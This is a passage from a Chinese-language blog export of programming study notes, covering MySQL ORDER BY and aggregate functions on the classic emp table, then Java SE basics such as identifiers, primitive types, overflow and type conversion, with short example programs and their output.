1600.00 |  300.00 |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
</blockquote>
<p><strong>建议写成</strong></p>
<p><strong>select * from emp order by sal;</strong></p>
<p>题目：找出工作岗位是salesman的员工，并且要求按照薪资的降序排列。</p>
<p><strong>select ename, sal, job from emp where job = ‘salesman’ order by sal desc;</strong></p>
<blockquote>
<p>+——–+———+———-+<br>| ename  | sal     | job      |<br>+——–+———+———-+<br>| ALLEN  | 1600.00 | SALESMAN |<br>| TURNER | 1500.00 | SALESMAN |<br>| WARD   | 1250.00 | SALESMAN |<br>| MARTIN | 1250.00 | SALESMAN |</p>
</blockquote>
<p><strong>语句格式与执行顺序</strong></p>
<blockquote>
<p>select</p>
<p>​    *     3</p>
<p>from  </p>
<p>​    tablename     1</p>
<p>where</p>
<p>​    条件      2</p>
<p>order by      4</p>
<p>​    ……</p>
</blockquote>
<p>order by 是最后执行的</p>
<p><strong>select ename,sal as salary from emp order by salary;</strong></p>
<blockquote>
<p>+——–+———+<br>| ename  | salary  |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |<br>+——–+———+</p>
</blockquote>
<h1 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a><strong>分组函数</strong></h1><p>count 计数<br>sum 求和<br>avg 平均值<br>max 最大值<br>min 最小值</p>
<p>记住：所有分组的函数都是对“某一组”数据进行操作的。</p>
<p>题目：找出员工工资总和</p>
<p>select sum(sal) sal from emp;<br>select max(sal) sal from emp;<br>select min(sal) sal from emp;<br>select avg(sal) sal from emp;<br>select count(ename) ename from emp;</p>
<blockquote>
<p>+———+<br>| sal     |<br>+———+<br>| 5000.00 |<br>+———+<br>1 row in set (0.01 sec)</p>
<p>+——–+<br>| sal    |<br>+——–+<br>| 800.00 |<br>+——–+<br>1 row in set (0.00 sec)</p>
<p>+————-+<br>| sal         |<br>+————-+<br>| 2073.214286 |<br>+————-+<br>1 row in set (0.00 sec)</p>
<p>+——-+<br>| ename |<br>+——-+<br>|    14 |<br>+——-+</p>
</blockquote>
<p>分组函数一共五个，还有另一个名字：多行处理函数。<br>多行处理函数的特点：输入多行，最终输出的结果是一行。</p>
<p>分组函数自动忽略NULL。<br>select count(comm) from emp;</p>
<blockquote>
<p>+————-+<br>| count(comm) |<br>+————-+<br>|           4 |<br>+————-+</p>
</blockquote>
<h1 id="单行处理函数"><a href="#单行处理函数" class="headerlink" title="单行处理函数"></a>单行处理函数</h1><p><strong>输入一行，输出一行</strong></p>
<p>计算每个员工的年薪？<br>select ename, (sal+comm) * 12 as yearsal from emp;<br>重点：所有数据库明文规定只要有NULL参与运算的运算结果一定是NULL</p>
<p><strong>ifnull()</strong>空处理函数？<br>    ifnull(可能为NULL的数据，被当做什么处理)</p>
<p>select ename, (sal+(ifnull(comm,0))) * 12 as yearsal from emp;</p>
<blockquote>
<p>+——–+———-+<br>| ename  | yearsal  |<br>+——–+———-+<br>| SMITH  |  9600.00 |<br>| ALLEN  | 22800.00 |<br>| WARD   | 21000.00 |<br>| JONES  | 35700.00 |<br>| MARTIN | 31800.00 |<br>| BLAKE  | 34200.00 |<br>| CLARK  | 29400.00 |<br>| SCOTT  | 36000.00 |<br>| KING   | 60000.00 |<br>| TURNER | 18000.00 |<br>| ADAMS  | 13200.00 |<br>| JAMES  | 11400.00 |<br>| FORD   | 36000.00 |<br>| MILLER | 15600.00 |<br>+——–+———-+</p>
</blockquote>
<p>题目：找出工资高于平均工资的员工。</p>
<p>select ename, sal from emp where sal &gt; avg(sal);</p>
<p>报错：ERROR 1111 (HY000): Invalid use of group function</p>
<p>select avg(sal) from emp;</p>
<p>+————-+<br>| avg(sal)    |<br>+————-+<br>| 2073.214286 |<br>+————-+</p>
<p>SQL语法当中有一个语法规则，分组函数不可直接使用在where子句当中。</p>
<p> count(*)和count(具体的某个字段)，他们有什么区别？</p>
<p>​    count(*)：不是统计某个字段中数据的个数，而是统计总记录条数</p>
<p>​    count(comm)：表示统计comm字段中不为NULL的数据总数量。</p>
<p>select count(*) from emp;</p>
<p>select count(comm) from emp;</p>
<p> <strong>分组函数也能组合起来用：</strong></p>
<p>mysql&gt; select count(<em>),sum(sal),avg(sal),max(sal),min(sal) from emp;<br>+———-+———-+————-+———-+———-+<br>| count(</em>) | sum(sal) | avg(sal)    | max(sal) | min(sal) |<br>+———-+———-+————-+———-+———-+<br>|       14 | 29025.00 | 2073.214286 |  5000.00 |   800.00 |<br>+———-+———-+————-+———-+———-+</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVASE</title>
    <url>/2020/09/21/JAVASE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="程序注释"><a href="#程序注释" class="headerlink" title="程序注释"></a><strong>程序注释</strong></h1><p>​    任何一套程序代码里面实际上都会由大量的程序逻辑所组成，但是如果要想对一套代码进行长期的维护，就需要编写大量的注释，对一些程序的代码功能要进行详细的解释，这样不仅为自己铺平道路，实际上也为后来接手的工程师铺平道路。</p>
<blockquote>
<p>关于注释的笑话：有一位程序员到一家新的公司进行项目开发，突然有一天老板说，某一个功能执行的速度实在是太慢了，让这位程序员修改一下，后来这个程序员找到了相关源代码，里面写上了一个注释“后面的兄弟，悠着点，我在这里吗让代码延迟了3秒，别一下子改的太快了，给后面的兄弟留点发挥空间”，于是这位工程师根据前辈的注释进行了修改，将原始的延迟3秒，修改为了延迟2.5秒，速度变快了，老板给了奖金。</p>
</blockquote>
<p>​    在Java程序里面针对于代码的注释一共提供了三种注释形式：</p>
<ul>
<li><p>​        单行注释：“// 注释内容”;（考虑到开发工具的代码格式化问题）</p>
</li>
<li><p>​        多行注释：“/*… 注释内容 … */“;</p>
</li>
<li><p>​        文档注释：“/** … 文档注释的特定语法标记进行注释的编写 …… */”，这种注释往往可以结合开发工具使用</p>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class YootkDemo&#123; &#x2F;&#x2F; 【单行注释】定义程序的执行主类</span><br><span class="line">	public static void main(String args[])&#123;&#x2F;&#x2F; 【单行注释】程序的执行起点，主方法</span><br><span class="line">		&#x2F;*【多行注释】</span><br><span class="line">			以下的程序代码是在屏幕上进行一些提示信息的输出，如果有需要则可以再里面进行多行的定义	</span><br><span class="line">		*&#x2F;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>​    既然所有的注释文字不会自己进行代码的编译处理，所以在实际项目开发之中可以将一些暂时不需要的代码通过注释的形式让其失效，这种形式要比直接删除代码更高效。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public class YootkDemo&#123; &#x2F;&#x2F; 【单行注释】定义程序的执行主类</span><br><span class="line">	public static void main(String args[])&#123;&#x2F;&#x2F; 【单行注释】程序的执行起点，主方法</span><br><span class="line">		&#x2F;*【多行注释】</span><br><span class="line">			以下的程序代码是在屏幕上进行一些提示信息的输出，如果有需要则可以再里面进行多行的定义	</span><br><span class="line">		*&#x2F;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;); </span><br><span class="line">		&#x2F;&#x2F; 【代码失效】 System.out.println(&quot;江湖上称我为&quot;); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在以后进行项目开发的时候，一些暂时不需要的代码就可以利用注释进行关闭。</p>
<h1 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h1><p>　　<strong>在任何一个程序里面都一定会有大量的名称进行一些特定结构的声明，例如：在Java程序里面一直强调，每一个程序都是一个类，那么所有的类就一定要有类的名称，这就是属于一个标识符，所有的程序编译器都是依据这个名称来进行代码结构管理的，既然要进行管理，对于名称就有它的命名要求。</strong></p>
<pre><code>在java之中所有的标识符由字母、数字、下划线（_）以及“$”所组成的，其中不能使用数字开头，不能够使用java关键字（保留字）进行标识符定义。
顺便说一下：正常的标识符里面一般都要求有具体的严格意义，例如：你在程序里面定义了a、b、c一系列的标识符，那么这些意义不明确，所以代码
阅读起来是非常困难的。另外对于标识符定义中的“$”也不要去直接使用，因为其有特殊的含义，所以一般来讲标识符的组成就是字母、下划线、数字
所组成的，建议使用字母开头。</code></pre><blockquote>
<p><strong>yootk_name,YootkDemo,teacherLee,num_110</strong>(正确形式)</p>
</blockquote>
<blockquote>
<p><em>110_No.1</em>(使用数字开头、并且使用了“.”作为了标识符的组成)<br><em>abc#hello</em>(使用了非法的“#”符号作为了标识符)<br><em>class</em>(使用了程序中的关键字（保留字），那么这种标识符也是错误的。)</p>
</blockquote>
<p>　　<strong>任何的编程语言里面都会提供有大量的关键字，这些关键字往往都具有特殊的含义，java中的关键字会随着每次版本的更新而有所扩充。</strong></p>
<blockquote>
<p>很多的语言里面都有许多相同的关键字（java、C、++是一个系列的）：for,if,else,swich,while、……；<br>java有两个未使用到的关键字：goto（代码调试的万恶之手）、const(定义常量，被final所取代)；<br>有三个特殊含义的标记（严格来讲不属于关键字）：null、true、false；<br>JDK1.4之后更新了assert关键字，用于断言操作；<br>JDK1.5之后扩充了enum关键字，用于进行枚举定义；<br>JDK1.10之后扩充var关键字，用于进行匹配类型变量的定义；<br>JDK1.13之后扩充yield关键字，进行局部返回。</p>
</blockquote>
<p><em>除了以上的标识符定义要求之外，实际上java也考虑到中国的地位，也推出了一些比较神奇的做法，可以直接使用中文进行标识符的定义。</em></p>
<p><strong>范例：使用中文标识符</strong></p>
<pre><code>    public class 优拓公开课{ // 【单行注释】定义程序的执行主类
    public static void main(String args[]){// 【单行注释】程序的执行起点，主方法
        /*【多行注释】
            以下的程序代码是在屏幕上进行一些提示信息的输出，如果有需要则可以再里面进行多行的定义    
        */
        int 年龄 = 18;//中文定义
        System.out.println(&quot;Hello world!&quot;); 
        // 【代码失效】 System.out.println(&quot;江湖上称我为&quot;); 
    }
}</code></pre><p>​    这种定义的形式可以作为娱乐，但是正常的开发者一般都不会采用这样的形式来进行标识符的定义，还应该使用传统的字母、数字之类的进行定义，除了标识符的组成要求之外，在Java里面或者是在实际的工作之中还会有一些命名规范的出现，命名规范都要求遵循标识符的组成原则，但是对于大小写的定义是有描述的，例如：类名称每个单词的首字母大写（例如：YootkDemo）,这些具体的描述可以根据不同的公司来动态调整。</p>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p><strong>任何的程序设计语言本身就属于一场数字的游戏，如果说我们的人生就是一部自我完善的坚史，那么编程语言既然是一种现实物理和数学的抽象，其背后就是数字的一场游戏（计算机的组成的核心本质只有数字：“0”、“1”），那么既然要进行数字的操作，则需要进行数据的存储，所以任何的编程语言里面都会设计有一系列的数据类型，利用不同的数据类型保存相应的类型</strong></p>
<p><em>例如：如果要是描述年龄，那么肯定要使用整数。如果要进行折扣处理的话，往往就希望这个小数点越小越好，所以就需要浮点型。所以任何一门完善的编程语言其数据类型的支持程序都是异常丰富的。</em><br>　　<strong>在java程序的内部对于数据类型实际上分为两大类型：</strong></p>
<blockquote>
<p>【分类】基本数据类型：所有的数据操作都是采用值传递，相当于把数据给了对方一个副本信息，副本信息的修改不影响原始的数据内容，这些基本数据类型也是构成程序开发的基本环节；</p>
</blockquote>
<pre><code>|-【子分类】整型：byte、short、int、long;        --&gt;默认值：0
|-【子分类】浮点型（有小数点=小数）：float、double;    --&gt;默认值:0.0
|-【子分类】字符型：char;                --&gt;默认值:&apos;\u0000&apos;(十六进制)
|-【子分类】布尔型：boolean.                --&gt;默认值:false(特殊意义的关键字)</code></pre><p>​    </p>
<blockquote>
<p>【分类】引用数据类型：是进行内存的数据操作，给的内存使用权。是所有初学者最难理解的部分；</p>
</blockquote>
<pre><code>|-有三种引用数据类型：数组、类、接口。            --&gt;默认值:null(特殊意义的关键字)

提示：整个的Java编程语言之中由于对C、C++进行了结构上的优化(Java是基于C++开发出来的),在整个的C、C++里面最让人头疼的部分就是指针，而java为了解决这个问题，取消了指针的定义，而使用了更加简单的引用数据类型来进行代替，在后面进行面向对象讲解开始的时候将对引用数据类型做出全面的分析</code></pre><p>　　<strong>在java开发过程之中，对于基本数据类型（最为核心的数据类型）默认一共提供有八种类型，其中有7种类型是由明确的数据存储范围（计算机里面所有的数据内容都是通过二进制的形式保存的，所有的数据都有一个保存的上限&amp;下限）</strong></p>
<pre><code>-byte: 描述的是字节，在进行网络数据传输一定是字节数据处理，也会用在编码转换上；（1字节）
-int：描述的是整型，例如：定义年龄；（4字节）
-long：描述的是长整型（范围比int广），用在进行文件大小描述、日期时间的描述上；（8个字节）
-double：描述小数，例如：要进行工资的定义，则肯定是小数；（8个字节）
-char：主要是进行中文处理；（2个字节）
-*boolean*：进行逻辑表述。</code></pre><h1 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h1><p>  <strong>变量与常量是在整个程序计算过程之中主要使用的两个数据的存储形式，其中所有给定的不可能修改的内容我们将其称为常量，而所有可以修改的内容就将其称为变量。</strong></p>
<p><em>范例：观察变量</em></p>
<pre><code>public class DongJun{ 
public static void main(String DongJun[]){
    //10是一个数字，既然已经定义好了10，那么就意味着这个内容无法修改了
    System.out.println(10); //常量
}
}</code></pre><blockquote>
<p>程序执行结果:10</p>
</blockquote>
<p><strong>在上学的时候学校经常会用一种方式去惩戒哪些所谓的“调皮的学生”，就是将你的行为和处分决定记录在你的档案里面，这些内容将持续陪伴你，并且不会变更，那么就可以将这些记录定义为你个人的常量</strong><br><em>变量顾名思义就是内容可以改变的标记，所有的变量都一定要有其对应的数据类型，例如:int,double都属于数据类型，每一种变量可以根据其定义的数据类型进行内容的修改。</em></p>
<blockquote>
<p> <strong>如果要想使用变量则必须进行定义，而变量的定义语法形式为：“数据类型 变量名称 = 默认值”，而这个变量名称实际上就是之前讲解的标识符的组成，相当于你自己定义的有意义的名称。</strong></p>
</blockquote>
<p><em>范例：定义变量</em></p>
<pre><code>public class DongJun{ 
public static void main(String DongJun[]){
    //所有程序语言最后一定要使用;作为结尾
    int age = 10;//定义一个整型变量，并且设置了默认值
    System.out.println(age); //输出变量内容
    age = 19; //赋值
    System.out.println(age); //输出变量内容
}
}    </code></pre><blockquote>
<p>程序执行结果： 18<br>       19</p>
</blockquote>
<p><strong>按照正常的设计来讲每一种数据类型即便不设置默认值，那么也应该使用其对应数据类型的默认值进行定义，但是如果你的代码写成如下的形式，则执行的时候一定是错误的</strong></p>
<pre><code>public class DongJun{ 
    public static void main(String DongJun[]){
        int age ;//如果现在没有定义具体的内容，则应该使用默认值“0”来表示
        System.out.println(age);
    }
}</code></pre><blockquote>
<p>D:\yootk&gt;javac DongJun.java<br>DongJun.java:4: 错误: 可能尚未初始化变量age<br>                  System.out.println(age);</p>
</blockquote>
<p><strong>本次主要是观察变量声明和赋值在不同的JDk版本里面所带来的流程上的区别。</strong><br><em>范例：在JDK1.4及以前的版本</em></p>
<blockquote>
<p>要求在主方法中定义变量的同事一定要为其设置默认值，如果不设置就出错；</p>
</blockquote>
<p><em>范例：在JDK1.5及以及以后</em></p>
<blockquote>
<p>在主方法中定义变量的时候可以不设置默认值，但是在其使用之前一定要进行默认值设置，否则会出现编译错误</p>
</blockquote>
<p><strong>如果把常量比喻为不同的咖啡：美式、拿铁、卡布奇诺，这些调制好了的东西一般是不会发生改变的，而如果是变量那么就好比是你的咖啡杯，咖啡杯可以装不同咖啡，但是当你需要更换咖啡的时候，那么就意味着你原始的咖啡就没了，而盛的咖啡就是新的。</strong></p>
<h1 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h1><p><strong>在现实的生活里面数学上一般都会存在有整数的概念，整数实际上描述就是没有小数点的内容，是一个完整的十进制的数值。</strong><br><em>例如：如果要想表示一个人的年龄肯定要使用整数，如果要想去描述住房楼层肯定也使用整数，在Java程序里面，对于整数的数据类型一共有四种支持：Byte、short、int、long。</em><br>　　在给定的这四种整型数据类型里面，最为常用的数据类型就是Int型，在java程序之中任何的一个整型数字的常量默认对应的类型全部都是整型。<br><strong>定义int变量</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //数据类型 变量名称 = 常量、整数常量的默认类型为 int
        int number = 10; //定义一个整型变量
        // int变量-=  int变量数值 + 20 常量（int类型）
        number = number + 20; // 进行变量的加法计算
        System.out.println(number);
    }
}    </code></pre><blockquote>
<p>程序执行结果：30</p>
</blockquote>
<p><em>虽然int 可以解决大部分的整型的数据操作问题，但是从另外的角度来讲，对于当前程序开发来说，int本身是由其长度范围(-2147483648-2147483647),那么如果说超过了这个计算范围，则就有可能出错。</em></p>
<pre><code>public class DongJun{ 
static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
public static void main(String DongJun[]){
    //数据类型 变量名称 = 常量、整数常量的默认类型为 int
    int max = 2147483647; //定义一个整型变量
    // int变量-=  int变量数值 + 20 常量（int类型）
    max = max + 1; // 进行变量的加法计算
    System.out.println(max);
}
}</code></pre><blockquote>
<p>程序执行结果-2147483648</p>
</blockquote>
<p>这里面就存在了计算机之中的基本概念：二进制的数据计算问题了。在程序之中所有的数据都是被二进制的操作进行管理的，但是由于Java编程语言属于高级编程语言，所以对于一些底层的细节就由编程语言自己来处理。</p>
<pre><code>专业描述：Java之中int数据类型一共有32位，第一位属于符号位，其余的位数属于数据位。每一次进行所谓的加或减的时候实际上都是在底层进行了二进制数据计算，当已经最大值的似乎还“011111”，如果再进行加1的处理，符号位就会发生改变，所以就变为了最小值。</code></pre><p>　　<em>对于以上的问题在程序开发之中可以理解为数据的溢出，数据溢出采用的是一种循环的模式进行处理的。</em></p>
<p><strong>如果要想解决这种数据溢出的问题，那么最佳的做法就是扩大使用的数据范围，比int范围更大的数据范围就是long，所有的编程语言里面对于数据范围的扩大都使用自动的扩大的形式，例如：如果现在是一个int型变量和一个long型变量进行加法操作，那么必定要先进行数据类型的统一，而这种统一的操作过程就是将int类型自动转为long的类型。从而形成最终的两个long型变量的计算操作。</strong><br>范例：通过long数据类型解决int的溢出问题</p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //数据类型 变量名称 = 常量、整数常量的默认类型为 int
        int max = 2147483647; //定义一个整型变量
        // int变量-=  int变量数值 + 20 常量（int类型）
        System.out.println(max+1L);
    }
}</code></pre><blockquote>
<p>程序执行结果2147483648</p>
</blockquote>
<blockquote>
<p>由于默认的整数对应的类型为int,<em>所以如果要想将其变为long的常量则可以使用“整数L”、“整数l”（“小写L”比较坑）因为其长的和1很相似（如果你没有受过一定的训练是看不出的）</em><br><strong>结论：如果要想解决数据溢出问题，肯定要使用更大的数据类型来进行处理。</strong></p>
</blockquote>
<p>　　<em>这个时候就会出现一个新的概念：数据类型的转换，不同的数据类型之间是可以进行转换的，但是在进行转换的处理过程之中一般都会使用如下的两个转换原则。</em></p>
<blockquote>
<p>自动类型转换：保存数据范围小的数据类型如果遇见了保存范围数据大的数据类型，则范围小的数据类型自动转换为范围大的数据类型后再进行计算，之前的程序就属于这种自动转换。</p>
</blockquote>
<p><em>范例：数据类型的自动转换</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //数据类型 变量名称 = 常量、整数常量的默认类型为 int
        int num_a = 10 ;
        long num_b = 20;
        //num_a这个int变量由于其数据类型的位数不足，所以将自己转换为long类型后在于num_b进行加法计算
        lonmg result = num_a + num_b;
        System.out.println(result);
    }
}</code></pre><p>​    </p>
<blockquote>
<p>强制类型转换:将保存数据范围大的数据类型强制的变为保存数据范围小的数据类型，这种转换由于需要缩小数据类型的保存位数，所以就有可能产生数据溢出问（数据出错）</p>
</blockquote>
<p><em>范例：数据类型的强制转换</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //数据类型 变量名称 = 常量、整数常量的默认类型为 int
        //此时必须强制性的将整型常量转为long类型才可以正常保存在long变量之中
        long num = 2147483677L; //该类型已经超过了int的最大内容
        System.out.println(num);
        System.out.println((int)num);
    }
}</code></pre><blockquote>
<p>2147483677<br>-2147483619</p>
</blockquote>
<p><em>*所以这种数据范围的强制转型所带来的最为严重的问题就是有可能会有数据的溢出情况出现，所以如果你非要进行强制性类型转型，那么一定要注意其最终的目标数据类型是否可以包含下当前的数据内容。</em><br>    　　<em>通过以上的分析实际上就可以得到一个最为重要的结论：在进行不同数据类型操作的过程之中，一定会首发发送自动的扩大类型的转型操作，而后再进行计算，但是一般不建议使用强制的类型转换，因为有可能会有数据溢出的问题。</em></p>
<p><strong>既然有了整型的概念，就必须重点分析一下byte数据类型问题</strong></p>
<pre><code>回顾：针对于不同数据类型的使用
    byte：主要用于网络传输、二进制数据处理、编码转换（在讲解IO和网络编程会使用到）
    int：描述大部分的整型数值，以后见到整型的需求首先考虑就是int型变量或常量；
    long：主要描述文件大小或者是日期时间的数字（以后讲解到类库的时候会进行说明）</code></pre><p><em>byte描述的是一个字节，java程序开发之中的每一个字节所能描述的数据范围:”-128-127”，就需要注意其不能够存储更大的数据信息。</em></p>
<p><strong>范例：定义byte变量</strong></p>
<pre><code>public class DongJun{ 
static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
public static void main(String DongJun[]){
    byte data = 10 ; //定义一个byte变量
    System.out.println(data);
}
}</code></pre><blockquote>
<p>10</p>
</blockquote>
<p><strong>以上的程序实现了最为基础的byte变量的定义以及内容的输出，但是在整个的程序执行过程之中会有一个小小的问题出现了：按照之前的概念来讲，此时的数字10应该是一个int型的常量，那么按照以上操作来讲应该是int型的常量赋值给了byte型的变量，出现了一个与之前概念不匹配的应用环境，之所以没有这种强制的转换需求，主要的原因在于：Java针对于符合byte范围内，那么就必须进行强制转换处理。</strong></p>
<p><em>范例：超过byte范围强制处理</em><br>    public class DongJun{<br>        static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示<br>        public static void main(String DongJun[]){<br>            byte data = (byte)250 ; //定义一个byte变量<br>            System.out.println(data);<br>        }<br>    }</p>
<blockquote>
<p>-6</p>
</blockquote>
<p><em>此时由于设置的整型内容超过了byte范围，所以一旦强制性转换之后就产生了数据的溢出问题；</em></p>
<h1 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h1><blockquote>
<p><strong>浮点型最大的特点就是在数字里面包含有小数点，在Java程序里面针对于浮点型数据类型提供了两个关键字：</strong></p>
</blockquote>
<pre><code>- 单精度浮点数据类型：float,包含32位的数据长度
- 双精度浮点数据类型：double,包含64位的数据长度
在Java里面，任何的一个小数其默认的数据类型均为double(double可以保存全宇宙里面最大的一个数值)，double是整个是所有数据类型之中可以保存数据内容最大的一种类型。</code></pre><p><em>范例：定义double变量</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        //double 变量 = 常量 (double变量)
        double num_a  = 99.89 ; //定义double变量
        int num_b = 199; 
        //double变量（num_a） + double变量(num_b，int自动转为double) = double结果
        double result = num_a + num_b ; 
        System.out.println(result);
    }
}

&gt;298.89</code></pre><p>　　<strong>java之所以没有使用float作为小数的默认类型，主要是考虑到float计算本身存在的二进制位的操作问题（会产生精度问题），这个问题是整个计算机编程语言行业之中最大的问题（娘胎带的问题了）,所以在java里面如果要想定义float变量，就必须将小数的常量进行强制的类型转换才可以正常进行。</strong></p>
<p><strong>范例：定义float型变量</strong></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        float num_a  = 10.0F ; //将double常量强制转换为float变量
        float num_b  = (float) 0.4; //将double常量强制转换为float变量
        System.out.println(num_a/num_b);</code></pre><p>​<br>​                </p>
<pre><code>    }
}

&gt; 25.0</code></pre><p><em>范例：观察float可能存在的问题</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        float num_a  = 9.9F ; //将double常量强制转换为float变量
        float num_b  = (float) 0.3; //将double常量强制转换为float变量
        System.out.println(num_a/num_b);</code></pre><p>​<br>​            </p>
<pre><code>    }
}</code></pre><blockquote>
<p>32.999996(会出现许多小数)<br>　　<strong>float数据类型本身是有问题的，而正因为这些问题的存在，所以不建议使用float这种数据类型进行浮点数定义，最好使用double。</strong></p>
</blockquote>
<p><em>范例：通过double可以解决float的问题</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        double num_a  = 9.9 ; //将double常量强制转换为float变量
        double num_b  =  0.3; //将double常量强制转换为float变量
        System.out.println(num_a/num_b);</code></pre><p>​<br>​                </p>
<pre><code>    }
}</code></pre><blockquote>
<p>33.0</p>
</blockquote>
<p>　　<em>在以后的项目开发过程之中肯定要首选double作为小数的数据类型。</em></p>
<p><strong>在项目的开发之中整型和浮点型之间最大的区别就是小数点，也就是所有的整型数据内容是不会保留小数位的，那么如果说现在计算的数据本身会产生小数位，则如果没有使用浮点型而使用整型，对应的小数位会全部丢弃。(如果要想准确，那么就必须采用小数来进行计算，需要将其中的一个计算的内容变成double)</strong></p>
<p><em>范例：解决小数点的保留问题</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        int num_a = 9 ;
        int num_b = 2 ; 
        System.out.println(num_a/(double)num_b);

    }
}</code></pre><blockquote>
<p>4.5</p>
</blockquote>
<p><strong>如果在计算之中某一个类型变为了double，则其他的类型都要变为double（double范围是最广的），这个时候当前的计算结果一定是double类型。</strong></p>
<pre><code>通过以上的分析，应该就已经非常清楚了这些数值型的数据类型的自动转换操作过程：byte&gt;short&gt;int&gt;long&gt;float&gt;double(保存范围小的自动进行转换),而在进行强制类型转换的时候，如果浮点型强制变为了整型，那么就会丢掉小数点。</code></pre><blockquote>
<p>在未来选择数值型数字类型的时候，整型就使用int,浮点型（小数）就使用double</p>
</blockquote>
<h1 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h1><p>　　<em>在java程序里面，依然提供有传统编程语言使用的字符的概念，字符是使用“’”声明的一个内容，字符提供有char关键字来进行类型的定义。</em></p>
<p><em>范例：字符的定义</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        char c=  &apos;y&apos;;//字符需要使用单引号进行声明
        System.out.println(c);

    }
}</code></pre><blockquote>
<p>y</p>
</blockquote>
<p><strong>在使用字符进行初始化内容赋值的时候后，一定只能够设置一位内容，如果设置了多位，语法一定会出错。</strong>　</p>
<p>　　<strong>在程序之中字符（char）可以和整型（int）直接进行转化处理，而字符转换为整型之后得到的数值就属于字符的编码。</strong></p>
<blockquote>
<p>　　那么既然所有的字符在JVM里面都有相应的编码存在，这样一来就必须非常清楚几个常见的字符范围的定义：</p>
</blockquote>
<pre><code>小写字符范围（&apos;a&apos;~&apos;z&apos;）:97~122;
大写字符范围（&apos;A&apos;~&apos;Z&apos;）:65~90;
数字字符范围（&apos;0&apos;~&apos;9&apos;）:48~57</code></pre><blockquote>
<p>于是这个时候有人发现一个问题：大写字符和小写字母之间的编码的数值内容差32个，所以理论上修改数值就可以进行大小写的控制，下面市县一个小写字母转大写字母的操作。</p>
</blockquote>
<p><em>范例：小写字母转为大写字母</em></p>
<pre><code>public class DongJun{ 
    static int age; //如果现在没有定义具体的内容，则应该使用默认值“0”来表示
    public static void main(String DongJun[]){
        char c=  &apos;a&apos;-32;//字符需要使用单引号进行声明
        System.out.println(c);

    }
}</code></pre><blockquote>
<p>A</p>
</blockquote>
